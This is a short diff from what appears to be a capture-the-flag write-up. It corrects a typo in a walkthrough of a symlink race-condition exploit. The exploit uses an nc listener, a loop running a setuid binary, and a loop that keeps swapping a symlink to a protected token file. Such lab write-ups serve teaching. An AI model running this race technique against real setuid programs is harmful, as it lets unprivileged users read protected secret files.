@@ -121,7 +121,8 @@ My instinct is to try for a one-shot approach, but actually, the required info c
 1. This is simply a network listener set to keep listening - `nc -lk 18211`
 2. This is process continuously loops trying to read a target - `while true; do ../flag10/flag10 target 127.0.0.1; done`
 3. While this process continuously swaps the target between pointing to an accessable file and the token file - `while true; do ln -sf dummy target; ln -sf ../flag10/token target; done` 
-Quiet quickly, you should see the token on the console of process 1
+
+Quite quickly, you should see the token on the console of process 1...
 ```console
 .oO Oo.
 dummy
